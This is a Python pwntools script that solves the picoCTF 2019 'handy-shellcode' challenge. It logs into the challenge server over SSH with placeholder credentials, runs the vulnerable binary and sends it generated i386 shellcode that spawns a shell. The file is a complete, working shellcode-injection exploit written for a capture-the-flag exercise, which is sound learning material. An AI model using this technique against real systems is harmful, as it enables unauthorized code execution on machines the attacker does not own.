#!/usr/bin/python3

from pwn import *

#local/remote switch
LOCAL = False

if(LOCAL):
	elf = ELF('./vuln')
	p = elf.process()
else:
	host = '2019shell1.picoctf.com'	
	chalDirectory = '/problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9'

	#init ssh credential
	user = 'username'
	pw = 'password'

	#ssh into the remote server
	shell = ssh(host=host, user=user, password=pw)

	#execute the vuln binary
	p = shell.run(chalDirectory+'/vuln')


#since the challenge ask us to enter the shellcode
#((void (*)())buf)(); #place assembly shellcode to execute
#so we craft a i386 sh() shellcode in assembly format to execute it (the elf is run in i386 arch)
p.sendline(asm(shellcraft.i386.linux.sh()))

p.interactive()
